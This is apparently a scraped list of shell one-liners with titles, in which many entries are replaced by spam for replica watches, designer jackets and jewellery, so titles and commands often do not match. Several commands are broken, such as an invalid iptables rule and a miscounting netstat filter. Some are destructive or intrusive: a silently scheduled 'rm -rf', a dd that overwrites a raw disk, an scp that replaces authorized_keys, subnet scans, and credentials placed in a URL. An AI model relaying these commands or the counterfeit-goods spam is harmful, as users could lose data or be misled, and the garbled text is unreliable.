# Convert a file from ISO-8859-1 (or whatever) to UTF-8 (or whatever)
tcs -f 8859-1 -t utf /some/file


# Text message on wallpaper
wallpaperWarn() { BG="/desktop/gnome/background/picture_filename"; convert "`gconftool-2 -g $BG`" -pointsize 70 -draw "gravity center fill red  text 0,-360 'Warn' fill white  text 0,360 'Warn'" /tmp/w.jpg; gconftool-2 --set $BG -t string "/tmp/w.jpg"; }


# multimedia ping


# Repeat a portrait eight times so it can be cut out from a 6
montage input.jpg -auto-orient -duplicate 7 -geometry 500 -frame 5 output.jpg


# Compare a remote dir with a local dir
diff -y <(ssh user@host  find /boot|sort) <(find /boot|sort)


# Find name of package which installed a given shell command
dpkg -S "$(readlink -e $(which w))" | cut -d ':' -f 1


# Generate an XKCD #936 style 4 word password
perl -F'\s+' -anE 'push @w,$F[1];END{$r.=splice @w,rand @w,1 for(1..4);say $r}' diceware.wordlist.asc


# Search google.com on your terminal
function google { Q="$@";GOOG_URL='https://www.google.com/search?tbs=li:1&q=';AGENT="Mozilla/4.0";stream=$(curl -A "$AGENT" -skLm 10 "${GOOG_URL}${Q//\ /+}");echo "$stream" | grep -o "href=\"/url[^\&]*&amp;" | sed 's/href=".url.q=\([^\&]*\).*/\1/';}


# Read and write to TCP or UDP sockets with common bash tools
Timberland Hombres 6 Inch Botas Todo Negro [f0e5] - &euro;129.27 : toma de Timberland, outletstimberland.cc


# Show hidden files
omega watches


# Read and write to TCP or UDP sockets with common bash tools
Constellation Brushed Chronometer  - $207.00 : Zen Cart!, The Art of E-commerce


# Update pandoc via cabal
cabal update && cabal install pandoc


# If (and only if) the variable is not set, prompt users and give them a default option already filled in.
Replica Patek Philippe Nautilus Series 5726A-001 men's automatic mechanical watches (Patek Philippe) [42f7] - $242.00 : Zen Cart!, The Art of E-commerce


# Get the current gold price
Qui è possibile controllare meraviglioso Audemars Piguet Replica Watches


# List hostnames of all IPs
for IP in $(/sbin/ifconfig | fgrep addr: | sed 's/.*addr:\([[0-9.]*\) .*/\1/') ; do host $IP | awk '{print $5}'; done


# Play musical notes from octave of middle C
man beep | sed -e '1,/Note/d; /BUGS/,$d' | awk '{print $2}' | xargs -IX sudo beep -f X -l 500


# Display minutes remaining on Macbook battery
pmset -g batt | awk '/^ /{print $5}'


# find out how many days since given date
echo $((($(date +%s)-$(date +%s -d "march 1"))/86400))


# Write comments to your history.
comment() { echo "" > /dev/null; }


# Install your ssh key file on a remote system
scp ~/.ssh/id_rsa.pub user@remote:.ssh/authorized_keys


# Find top 10 largest files
Ähnliche Artikel : moncler, 2016moncler.top


# convert PDF manga to Image's
gs -dNOPAUSE -dBATCH -sDEVICE=png16m -sOutputFile=blood%d.png -r700x600 out.pdf


# Show all LISTENing and open server connections, with port number and process name/pid
netstat -tulpn


# A bit of fun for when your bored
Command to long check description or sample output


# view solaris system logs
more /var/adm/messages


# ps -A
ps -A


# Command line invocation of ImageMagick to resize a file
convert panorama_rainbow_2005.jpg -resize 40% panorama_rainbow_compress.jpg


# Remove comments and empty lines from a conf file
grep ^[^#] /etc/file.conf


# Purge configuration files of removed packages on  debian based systems
dpkg -l | grep ^rc | awk '{print $2}' | xargs dpkg -P


# Makes a Zenity select list based on entries in your wpa_supplicant.conf
grep -oE "ssid=\".*\"" /etc/wpa_supplicant.conf | cut -c6- | sed s/\"//g | zenity --list --title="Choose Access Point" --column="SSID"


# remove the last of all html files in a directory
a=($(ls *html)) && a=${a[$(expr ${#a[@]} - 1)]} && rm $a


# encode HTML entities
Jimmy Choo Schuhe: Jimmy Choo, Jimmy Choo Schuhe


# Stream YouTube URL directly to mplayer^w mpv.
mpv "https://"


# display memory usage of a process
TOTAL_RAM=`free | head -n 2 | tail -n 1 | awk '{ print $2 }'`; PROC_RSS=`ps axo rss,comm | grep [h]ttpd | awk '{ TOTAL += $1 } END { print TOTAL }'`; PROC_PCT=`echo "scale=4; ( $PROC_RSS/$TOTAL_RAM ) * 100" | bc`; echo "RAM Used by HTTP: $PROC_PCT%"


# How many lines in your c project?
find -name *.\[c\|h\] | xargs wc -l


# Recursive chmod all *.sh files within the current directory
find ./ -name "*.sh" -exec chmod +x {} \;


# Play ISO/DVD-files and activate dvd-menu and mouse menu clicks.
mplayer dvdnav:// -dvd-device foo.img -mouse-movements


# Make ABBA better (requires firefox)
wget -O - -q http://www.azlyrics.com/lyrics/abba/takeachanceonme.html | sed -e 's/[cC]hance/dump/g' > ~/tdom.htm && firefox ~/tdom.htm


# Get your outgoing IP address
curl -s httpbin.org/ip | jq -r .origin


# extract email adresses from some file (or any other pattern)
grep -Eio '([[:alnum:]_.]+@[[:alnum:]_]+?\.[[:alpha:].]{2,6})' file.html


# Get the list of root nameservers for a given TLD
dig +short NS org.


# MAMP: "Can't connect to local MySQL server through socket '/tmp/mysql.sock' (2)" solution
sudo ln -s /Applications/MAMP/tmp/mysql/mysql.sock /tmp/mysql.sock


# View disk usage
du -hsL */


# write the output of a command to /var/log/user.log... each line will contain $USER, making this easy to grep for.
log() { (echo "\$ $@";$@) | logger -t $USER; }


# ssh-keygen -b 4048 -t rsa -C "comment"
ssh-keygen -b 4048 -t rsa -C "comment"


# Use exit codes that actually means something.
source <(egrep '^#define EX_.*' /usr/include/sysexits.h  | sed -e 's/#define/declare -r/g' | sed 's/\//#/g' | sed -e 's/\s\{1,\}/ /g' | sed -e 's/ \([0-9]\)/\=\1/'g )


# create a colorful &#30000; image
convert -size 32x32 \( xc:red xc:green +append \) \( xc:yellow xc:blue +append \) -append output.png


# diff output of two commands
diff <(tail -10 file1) <(tail -10 file2)


# make GNU find follow symbolic links
find -L /home/sonic/archive -name '*gz' -type f


# Create colorized html file from Vim or Vimdiff
:TOhtml


# Downlaoad websites to 5 level and browse offline!
wget -k -r -l 5 http://gentoo-install.com


# Change all xxx.png files' name to xxx@2x.png for iOS
ls -1 | sed 's/\(.*\)\.\(.*\)/\"&\" \"\1@2x\.\2\"/' | xargs -n2 mv


# Get your external IP address
wget -O - -q ip.boa.nu


# output your microphone to a remote computer's speaker
arecord -f dat | ssh -C user@host aplay -f dat


# display IP addresses with 5 or more unsuccessful login attempts today
lastb -i | grep "$(date '+%a %b %d')" | awk '{ print $3 }' | sort | uniq -c | awk '{ if ($1 >= 5) print $2; }'


# bulk dl files based on a pattern
curl -O http://hosted.met-art.com/generated_gallery/full/061606AnnaUkrainePasha/met-art-free-sample-00[00-19].jpg


# shows the space of a  folder in  bytes  ever  two seconds.
watch "df | grep /this/folder/"


# find a class or file within a number of jar files
for i in `find . | grep jar$`; do echo $i; jar tvf $i | grep 'search-string'; done;


# hostgrep: set ip and hostname from /etc/hosts (non-DNS)
Moncler Women Coats : Official Moncler Outlet Online Store-2012 New Moncler Jackets Hot Sale


# Make less act like cat if its input's contents can fit on one screen
AAA Replica TAG Heuer watches


# Schedule a script or command in x num hours, silently run in the background even if logged out
echo "nohup command rm -rf /phpsessions 1>&2 &>/dev/null 1>&2 &>/dev/null&" | at now + 3 hours 1>&2 &>/dev/null


# Perl One Liner to Generate a Random IP Address
echo $((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))


# Realtime lines per second in a log file
tail -F /var/log/nginx/access.log | python -c 'exec("import sys,time\nl=0\ne=int(time.time())\nfor line in sys.stdin:\n\tt = int(time.time())\n\tl += 1\n\tif t > e:\n\t\te = t\n\t\tprint l\n\t\tl = 0")'


# Output the content of your Active Directory in a CSV file
csvde -f test.csv


# send a message to a windows machine in a popup
echo "message" | smbclient -M NAME_OF_THE_COMPUTER


# underscore to camelCase
echo "hello_world" | sed -r 's/([a-z]+)_([a-z])([a-z]+)/\1\U\2\L\3/'




# Charms Pandora baratos , Desconto Pandora Jóias Apuramento 2015
180


# Rip audio from a video file.
mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <output-file> <input-file>


# Twit Amarok "now playing" song
curl -u <user>:<password> -d status="Amarok, now playing: $(dcop amarok default nowPlaying)" http://twitter.com/statuses/update.json


# Generate debian package without signing and only binaries
dpkg-buildpackage -b -rfakeroot -us -uc


# Print a list of all hardlinks in the working directory, recursively
find . -type f -a \! -links 1


# kvm disk info
while read X ; do printf "$X --"; virsh dumpxml $X | egrep "source dev|source file"; done< <(virsh list | awk '$1 ~ /^[1-9]/ { print $2 }')


# Serve current directory tree at http://$HOSTNAME:8080/
twistd -n web --path .


# check remote port  without telnet
Hublot horloges , EEN MILJOEN Series


# Find the real procesor speed when you use CPU scaling [cpuspeed]
awk -F": " '/cpu MHz\ */ { print "Processor (or core) running speed is: " $2 }' /proc/cpuinfo ; dmidecode | awk -F": " '/Current Speed/ { print "Processor real speed is: " $2 }'


# Top 10 commands used
history | awk '{print $2}' | awk 'BEGIN {FS="|"}{print $1}' | sort | uniq -c | sort -nr | head


# Write on the console without being registered
_ls


# 16 Character Random Password
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo;


# a function to find the fastest DNS server
Fake Rolex 18kt SS (two Tone) Champagne Serti Dial Blue Bezel Diamond And Sapphire Hour Markers [4bb7] - $222.00 : Professional replica watches stores, menwatches.com.cn


# Git reset added new files
Cartier Replica Watches


# encode a text to url_encoded format
groovy -e 'println URLEncoder.encode("Some text")'


# Convert epoch time to full date with Perl
perl -MPOSIX -le 'print strftime "%F", localtime 1234567890'


# Print all 256 colors for testing TERM or for a quick reference
for i in {0..256}; do echo -e "${i} \033[38;05;${i}m COLOR \033[0m"; done


# Show directories
ls -l | grep ^d


# Displaying system temperature
cat /proc/acpi/thermal_zone/THRM/temperature


# Show the total number of changes that every user committed to a Subversion repository
svn log -v --xml > log.xml; zorba -q 'let $log := doc("log.xml")/log/logentry return for $author in distinct-values($log/author) order by $author return concat($author, " ", sum(count($log[author=$author]/paths/path)), "&#xa;")' --serialize-text


# grep for specific function invocations
2014 NEW Moncler Gregoire Feather Jacket Grey Men 77 [9615] - $271.00 : Professional Moncler Down Jacket Outlet Store, monclerjacketoutlet.org


# Disco lights in the terminal
Hermes Kelly : Hermes 2013 del nuovo cinghia degli uomini negozio online all'ingrosso


# Highlight the plain text in XML (or HTML, SGML, etc)
Rolex watches


# undo tab close in firefox
<ctrl-shift-t>


# Highlight the plain text in XML (or HTML, SGML, etc)
xmlpager() { xmlindent "$@" | awk '{gsub(">",">'`tput setf 4`'"); gsub("<","'`tput sgr0`'<"); print;} END {print "'`tput sgr0`'"}' | less -r; }


# Generate White Noise
cat /dev/urandom > /dev/dsp


# Print trending topics on Twitter
curl -s mobile.twitter.com/search | sed -n '/trend_footer_list/,/\ul>/p' | awk -F\> '{print $3}' | awk -F\< '{print $1}' | sed '/^$/d'


# Make keyboard keys repeat properly
Copy Watches ROLEX DATEJUST 116234B - $213.00 : Professional replica watches stores, shorelinechms.com


# Using wget to receive an XML atom feed of your Gmail inbox
wget -O - 'https://USERNAMEHERE:PASSWORDHERE@mail.google.com/mail/feed/atom' --no-check-certificate


# Anonymous ssh using tor proxy (or any socks based proxy)
ssh -o ProxyCommand="nc -X 5 -x localhost:9050 %h %p" username@remote_host


# Make a pipe organ sound using XMMS and Python
xmms `python -c "print \"tone://\" + \";\".join([str(22*(2**x)) for x in range(9)])"`


# Read and write to TCP or UDP sockets with common bash tools
Hublot watches, Classic Fusion Series


# Sync MySQL Servers via secure SSH-tunnel
ssh -f -L3307:127.0.0.1:3306 -N -t -x user@host sleep 600 ; mk-table-sync --execute --verbose u=root,p=xxx,h=127.0.0.1,P=3307 u=root,p=xxx,h=localhost


# Search count how many times a number, character or string is present on a stream
echo something | awk '{ total += gsub(/yourstring/,"") } END { print total }'


# Get readline support for the sqlplus command.


# Install a Python virtual env without
pip install --user virtualenv; python -m virtualenv env


# Kill all background jobs
jobs | grep -o "[0-9]" | while read j; do kill %$j; done


# Change prompt to MS-DOS one (joke)
export PS1="C:\$( pwd | sed 's:/:\\\\\:g' )> "


# List process ids (including parent and child process) of a process given its name. Similar to pgrep
export proc=chrome && ps aux | grep $proc | grep -v grep |awk '{print $2}'


# Create a list <file3> containing IP malicious IP addresses not blocked by ufw (Firewall)
var="([0-9]{1,3}[\.]){3}[0-9]{1,3}"; wget -qO - http://infiltrated.net/blacklisted|sort|uniq|grep -E -o "$var">file1;ufw status|sort|uniq|grep -E -o "$var">file2;comm -2 -3 <(sort file1) <(sort file2) >file3;


# Convert clipboard HTML content to markdown (for github, trello, etc)
xclip -selection clipboard -o -t text/html | pandoc -f html -t markdown_github -


# extracting audio and video from a movie
ffmpeg -i source_movie.flv -vcodec mpeg2video target_video.m2v -acodec copy target_audio.mp3


# Write comments to your history.
comment() { echo "" > /dev/null; }


# Thread count per user
Replica montres haut de marque, Patek Philippe , complexes Montres fonction chronographe


# Get user's full name in Mac OS X
finger $(whoami) | awk '/Name:/ {print $4" "$5}'


# stop children visiting sex sites:www.baidu.com
iptables -A OUTPUT www.baidu.com -p tcp -j REJECT --reject-with tcp-reset


# gag version of current date
ddate


# Display a random man page
man $(ls /bin | shuf | head -1)


# Extract multiple tar files at once in zsh
tar -xi < *.tar


# List the size (in human readable form) of all sub folders from the current location
du . | sort -nr | awk '{split("KB MB GB TB", arr); idx=1; while ( $1 > 1024 ) { $1/=1024; idx++} printf "%10.2f",$1; print " " arr[idx] "\t" $2}' | head -25


# SSH connection with private key and port 222
ssh -i /root/.ssh/username\@hostname -p 222 username@hostname


# add untracked/changed items to a git repository before doing a commit and/or sending upstream
git status --porcelain | awk '{print $2}' | xargs git add


# add time to make output and redirect it to a file
make -j 2>&1 | while IFS= read -r line; do echo "$(date +"%d-%m-%Y@%T") $line"; done > make.out


# Download files linked in a RSS feed
Copy Watches Rolex Day Date Automatic Watch Diamond Bezel With Black Dial Roman Marking Post4176 - $210.00 : Professional replica watches stores, wc4aa.com


# use wget to check if a remote file exists
wget --spider -v http://www.server.com/path/file.ext


# To install guest additions in arch or manjaro linux, run the following command:
sudo pacman -S virtualbox-guest-utils


# Basic sed usage with xargs to refactor a node.js depdendency
Replica TAG Heuer F1 series Ms. CAC1311.FC6220 quartz watch (TAG Heuer) [f2bc] - $218.00 : Professional replica watches stores, oxymedia.org


# Better git diff, word delimited and colorized
Tiffany Golden Jewelry : Tiffany Outlet


# Enable Basic Security Mode (BSM) Auditing --Solaris
/etc/security/bsmconv


# Read and write to TCP or UDP sockets with common bash tools
Replica Patek Philippe Aquanaut Ladies Series 5069G-011 automatic mechanical watches (Patek Philippe) - $235.00 : Zen Cart!, The Art of E-commerce


# Read and write to TCP or UDP sockets with common bash tools
High Quality Best Swiss Replica Vacheron Constantin Watches, Buy the perfect imitations of Vacheron Constantin Watches easily.


# sending message to a logined user of group
Top Swiss Made Replica Rolex Watches Online Sale


# php show list pdo module
php -m|grep pdo


# Select rectangular screen area
Breitling Bentley A28362C2A633754P Crocodile Skin Bralecet Titanium Bezel Rectangle Watch [57c5] - $218.00 : TITLE, SITE_TAGLINE


# List all commands present on system
Cheap Links of London Charms Sale, New Arrivals Links Charms UK For You


# camelcase to underscore
echo thisIsATest | sed -r 's/([A-Z])/_\L\1/g'


# Get full directory path of a script regardless of where it is run from
dirname $(readlink -f ${BASH_SOURCE[0]})


# Synchronize date and time with a server over ssh
date --set="$(ssh user@server 'date -u')"


# Create a new file
> file


# 32 bits or 64 bits?
uname -p


# Grab a list of MP3s out of Firefox's cache
for i in `ls ~/.mozilla/firefox/*/Cache`; do file $i | grep -i mpeg | awk '{print $1}' | sed s/.$//; done


# Minimize Apps When Middle Clicking on Titlebar
gconftool-2 --set "/apps/metacity/general/action_middle_click_titlebar" --type string "minimize"


# Convert entire music library
replica rolex lady-datejust watch: white rolesor - combination of 904l steel and 18 ct white gold â€“ m179384-0007 - $213.00 : Replica Rolex Watches, rolexdatajust.cc


# Send your svn diff to meld
echo 'diff-cmd = meld' >> ~/.subversion/config


# Suspend an ssh session.
~ ctrl-z


# A bit of privacy in .bash_history
export HISTCONTROL=ignoreboth


# Better git diff, word delimited and colorized
2012 New! Moncler Canut Men Down Jackets Khaki - $275.00 : Professional Moncler Down Jacket Outlet Store, monclercoat.top


# Use AWS CLI and JQ to get a list of instances sorted by launch time
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,LaunchTime]' --output text | sort -n -k 2


# Suspend to RAM with KDE 4
dbus-send --system --print-reply --dest="org.freedesktop.login1" /org/freedesktop/login1 org.freedesktop.login1.Manager.Suspend boolean:true


# geoip information
GeoipLookUp(){ curl -A "Mozilla/5.0" -s "http://www.geody.com/geoip.php?ip=$1" | grep "^IP.*$1" | html2text; }


# Convert file type to unix utf-8
ex some_file "+set ff=unix fileencoding=utf-8" "+x"


# Not able to data in tee on using dual command like: tail and grep
tail -f log.txt | egrep --line-buffered 'WARN|ERROR' | tee filtered_output.txt


# ImageMagick now deals with RAW files.
Swarovski Necklaces outlet for engagement & wedding


# Preserve user variables when running commands with sudo.
Omega Gents ' Collection- & gt; : replica omega klokker, vastomegawatch.com


# grep processes list avoiding the grep itself
ps axu | grep [a]pache2


# Hide files and folders on GNOME Desktop.
cd ~/Desktop && for FILES in $(ls); do mv $FILES .${FILES}; done


# Bare Metal IRC Client
Copy Watches Audemars Piguet-Royal Oak Offshore Chronograph-25940SK.OO.D002CA [9583] - $214.00 : Professional replica watches stores, watches-shock.top


# Force laptop "idle" mode action when laptop lid is closed
echo 'LidSwitchIgnoreInhibited=no' > /etc/systemd/logind.conf.d/respect-inhibit-lid.conf


# Examine processes generating traffic on your website
Clubmaster


# List installed deb packages by size
dpkg-query -Wf '${Installed-Size}\t${Package}\n' | sort -n


# Video thumbnail
ffmpeg -ss 5 -i video.avi -vframes 1 -s 320x240 thumb.jpg


# Copy file content to X clipboard
!xclip -i %


# Better git diff, word delimited and colorized
Replica Watches Brequet


# List all commands present on system
AAA Replica Ulysse Nardin :


# Comment current line
<ESC> #


# Use the page up key to complete the command.
echo "\"\e[5~\": history-search-backward" >> ~/.inputrc


# List a large directory of files quickly
ls -U1


# Convert entire music library
New Rolex Watches, Rolex Explorer II


# Pushing changes to an empty git repository for the first time
git push --set-upstream origin master


# Convert entire music library
Stunning Brown Mermaid Floor-length Satin Strapless Dress With Layers [b0f1] - $272.00 : Professional wedding dresses stores, weddingdresseslove.me


# See the members of a group
getent group <group>


# use the find command and have it not print trailing slashes
find * -maxdepth 0 -type d


# Change a specific value in a path
echo /home/foo/dir1/bar |  awk -F/ -v OFS=/ '{$3 = "dir2"}1'


# remove all spaces from all files in current folder
Moncler Boots : Moncler Outlet 2014 , Moncler Outlet 2014


# Sort installed rpms by decreasing size.
rpm -qa --qf  "%-10{SIZE} %-30{NAME}\n" | sort -nr | less


# Better git diff, word delimited and colorized
Rolex watches


# Quick syntax highlighting with multiple output formats
Replica TAG Heuer Aquaracer series WAP2011.BA0830 men automatic mechanical watch (TagHeuer) [77de] - $214.00 : Professional replica watches stores, watches-shop.co


# move a lot of files over ssh
rsync -az /home/user/test user@sshServer:/tmp/


# Get the IP address of a machine. Just the IP, no junk.
ip -o -4 addr show | awk -F '[ /]+' '/global/ {print $4}'


# Compare a remote file with a local file
diff <(ssh user@host cat /path/to/remotefile) /path/to/localfile


# check if a word exists in files in  folder and subdolders
Result=$(grep -rnw "SearchString" /etc/)  if ((${#Result} > 0)) then     echo "found" else echo "nothing found"fi


# Ping scanning without nmap
prefix="10.0.0" && for i in `seq 25`; do ping -c 1 $prefix.$i &> /dev/null && echo "Answer from: $prefix.$i" ; done


# Checks all MySQL tables
myisamchk /path/to/mysql/files/*.MYI


# Look for English words in /dev/urandom
head -100000 /dev/urandom | strings > temp.txt && for w in $(cat webster-dictionary.txt); do if [ ${#w} -gt 3 ]; then grep -io $w temp.txt; fi; done


# encode HTML entities
Datejust


# Better git diff, word delimited and colorized
Tiffany Golden Jewelry : Tiffany Outlet


# Bypass 1000 Entry limit of Active Directory with ldapsearch
ldapsearch -LLL  -H ldap://${HOST}:389 -b 'DC=${DOMAIN},DC=${TLD}' -D '${USER}' -w 'password' objectclass=* -E pr=2147483647/noprompt


# Grep recursively your Python project with color highlighting the result and line numbers
&nbsp;&nbsp;&nbsp;&nbsp; Mont Blanc Ballpoint Pen Platinum Line Classique Meisterstuck - $105.00 : Professional montblanc pen stores, pens.nbalance574.com


# View webcam output using GStreamer pipeline
cvlc v4l2:///dev/video0


# Print all open regular files sorted by the number of file handles open to each.
beats by dre color headphones


# Re-run [re-edited] sequence of commands in vim history
In vim: q: && v[cursor movement]y && [paste/edit/save to /tmp/tmp.vim] && move to window to modify && :so /tmp/tmp.vim


# Generate MD5 of string and output only the hash checksum
echo -n "String to MD5" | md5sum | cut -b-32


# Flip from one directory to another
cd -


# Move a folder and merge it with another folder
Replica Breguet CLASSIQUE Series 1808BR/92/9W6 DD00 ( male form ) mechanical watches (Breguet) [e3f3] - $255.00 : TITLE, SITE_TAGLINE


# Search entire web server for preg_replace /e based php malware.
find / -name \*.php -exec grep -Hn preg_replace {} \;|grep /e|grep POST


# swap the java version being used
sudo update-alternatives --config java


# Make a new dir named with present week numer
mkdir -v `date +%W`W


# Count opening and closing braces in a string.
countbraces () { COUNT_OPENING=$(echo $1 | grep -o "(" | wc -l); COUNT_CLOSING=$(echo $1 | grep -o ")" | wc -l); echo Opening: $COUNT_OPENING; echo Closing: $COUNT_CLOSING; }


# Mount a disk image (dmg) file in Mac OSX
hdid somefile.dmg


# One-liner to draw a spinning cursor pinwheel in a terminal
for item in \\ \| / - \\ \| / - \\ \| / - \\ \| / - \\ \| / - \\ \| / -; do echo -ne "$item \r"; sleep .2; done; echo


# Get a list of ssh servers on the local subnet
nmap -p 22 10.3.1.1/16 | grep -B 4 "open"


# Embed next line on the end of current line using sed
sed  'X{N;s/\n//;}' file.txt (where X is the current line)


# Get the serial numbers from HP RAID
hpacucli controller all show config detail | grep -A 7 Fail | egrep '(Failed|Last|Serial Number|physicaldrive)'


# setup a tunnel from destination machine port 80 to localhost 2001, via a second (hub) machine.
ssh -N -L2001:localhost:80 -o "ProxyCommand ssh someuser@hubmachine nc -w 5 %h %p" someuser@destinationmachine


# Get the current gold price
Charms Pandora mixtes


# find all processes named hunger and force kill, minus the grep itself and output to a file called fu.bar
ps -auwx|egrep hunger|grep -v grep| awk '{print "kill -9",$1}' > ~/fu.bar


# Arguments too long
ls | xargs WHATEVER_COMMAND


# Log your internet download speed
echo $(date +%s) > start-time; URL=http://www.google.com; while true; do echo $(curl -L --w %{speed_download} -o/dev/null -s $URL) >> bps; sleep 10; done &


# Get IP from hostname
dig +short google.com


# Sort IP addresses
sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 /file/of/ip/addresses


# Number of open connections per ip.
netstat -an | grep 80 | wc -l


# Better git diff, word delimited and colorized
Tiffany Jewelry Necklaces Transparent Golden Key [a974] - $69.00 : Professional tiffany outlet stores, tiffanycoand.com.cn


# Show hidden files
Replica Omega Watches Brushed Chronometer Series 123.20.31.20.08.001 watch series - $197.00 : Professional Replica Omega Watches Store, watchesshop.top


# Highlight the plain text in XML (or HTML, SGML, etc)
Moncler Lontre Designer Coat For Women Khaki - $303.00 : Professional Moncler Down Jacket Outlet Store, monclerjacket.co


# Find all videos under current directory
find ./ -type f -print0 | xargs -0 file -iNf - | grep video | cut -d: -f1


# Get My Public IP Address
links2 -dump http://checkip.dyndns.com| egrep -m1 -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'


# concatenate compressed and uncompressed logs
zcat -f $(ls -tr access.log*)


# Install a deb package
sudo dpkg -i packagename.deb


# Sum file sizes
find . -type f -printf %s\\n | paste -sd+ | bc


# Terminate a frozen SSH-session
RETURN~.


# Go to parent directory of filename edited in last command
cd !$:h


# send incoming audio to a Icecast server (giss.tv)
rec -c 2 -r 44100 -s -t wav - | oggenc - | tee streamdump.ogg | oggfwd giss.tv 8000 password /mountpoint.ogg


# random xkcd comic
display "$(wget -q http://dynamic.xkcd.com/comic/random/ -O - | grep -Po '(?<=")http://imgs.xkcd.com/comics/[^"]+(png|jpg)')"


# Unzip all files with ".zip" extension.
unzip \*.zip


# Sum of the total resident memory Stainless.app is using.
ps -ec -o command,rss | grep Stainless | awk -F ' ' '{ x = x + $2 } END { print x/(1024) " MB."}'


# Bare Metal IRC Client
Replica Omega Speedmaster


# Short log format of Subversion history
svnll(){svn log "$@"|( read; while true; do read h||break; read; m=""; while read l; do echo "$l" | grep -q '^[-]\+$'&&break; [ -z "$m" ] && m=$l; done; echo "$h % $m" | sed 's#\(.*\) | \(.*\) | \([-0-9 :]\{16\}\).* % \(.*\)#\1 \2 (\3) \4#'; done)}


# get Hong Kong weather infomation from HK Observatory
wget -q -O - 'http://wap.weather.gov.hk/' | sed -r 's/<[^>]+>//g;/^UV/q' | grep -v '^$'


# Filter IPs out of files
egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' file.txt


# send echo to socket network
echo foo | ncat [ip address] [port]


# Use a var with more text only if it exists
Copy Watches BREITLING NAVITIMER A232G32NP - $208.00 : Professional replica watches stores, bestwatchestop.org


# Find in all files in the current directory, just a find shorthand
grep -H -n "pattern" *


# Use a var with more text only if it exists
Nike Running Shoes For Women and Mens UK Sale - Nike Running Shoes UK Shop


# Nice way to view source code
Replica Patek Philippe Aquanaut Series 5164A-001 men's automatic mechanical watches (Patek Philippe) - $237.00 : Zen Cart!, The Art of E-commerce


# ignore .DS_Store forever in GIT
echo .DS_Store >> ~/.gitignore


# Move all files untracked by git into a directory
git clean -n | sed 's/Would remove //; /Would not remove/d;' | xargs mv -t stuff/


# SSH connection through host in the middle; with key redirection
ssh -o "ProxyCommand ssh user@reachable_host -W %h:%p" user@unreacheable_host


# Test file system type before further commands execution
DIR=. ; FSTYPE=$(df -TP ${DIR} | grep -v Type | awk '{ print $2 }') ; echo "${FSTYPE}"


# Fill a hard drive with ones - like zero-fill, but the opposite :)
perl -e '$s="$s\xFF" while length($s)<512; print $s while 1' | dd of=/dev/sdX


# Convert from a decimal number to a binary number
echo 'ibase=10; obase=2; 127' | bc


# Mplayer save stream to file
mplayer -nolirc <Streaming_URL> -dumpstream -dumpfile output.mp3


# s3cmd du s3://bucket-name | awk '{print $0/1024/1024/1024
Moncler Jackets Women 5596 - $227.00 : Cheap Moncler Outlet Online Store, moncler.raiderranchlubbock.com


# encode HTML entities
AAA Replica Omega :


# Delete all non-printing characters from a file
tr -dc '[:print:]' < <file>


# Remove all old kernels
sudo apt-get purge $(dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print $2}' | grep -ve "$(uname -r | sed -r 's/-[a-z]+//')")


# Copy a folder with progress with pv
Hot Sale Rolex Datejust Watch - DRW3165 - $221.00 : Zen Cart!, The Art of E-commerce


# Read and write to TCP or UDP sockets with common bash tools
Hublot Classic Fusion Series


# Get a quote from Pooh
Replica Omega klokker


# Simple calendar from google spanning the width of the terminal
gcalcli --mon --width $((COLUMNS/8)) calw 2


# Sample logstash events on a redis queue
for i in {0..100}; do redis-cli LINDEX logstash ${i} | jq .type,.message; done


# Highlight the plain text in XML (or HTML, SGML, etc)
Replica PID 10011:Rolex Datejust Automatic Full Man Size Golden Strap Watches [3fd8] - $209.00 : Professional replica watches stores, watchformens.com


# Find files in current directory which are larger in size (500000k)
find . -type f -size +50000k -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'

